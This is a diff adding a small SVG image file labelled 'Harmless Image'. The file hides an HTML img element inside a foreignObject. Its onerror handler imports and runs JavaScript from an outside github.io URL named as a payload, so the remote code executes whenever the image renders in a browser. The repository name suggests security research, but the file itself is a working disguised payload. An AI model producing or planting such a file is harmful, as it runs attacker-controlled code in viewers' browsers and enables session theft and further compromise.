@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" xmlns:xlink="http://www.w3.org/1999/xlink">
+<text x="10" y="35" fill="red" font-family="Arial" font-size="24">Harmless Image</text>
+<g>
+<foreignObject x="0" y="40" width="200" height="60">
+<body xmlns="http://www.w3.org/1999/xhtml" style="margin:0;padding:0;">
+<img src="nonexistent.jpg" onerror="import('https://spaceDentist1327.github.io/security-research-tools/payload.js')"></img>
+</body>
+</foreignObject>
+</g>
+</svg>
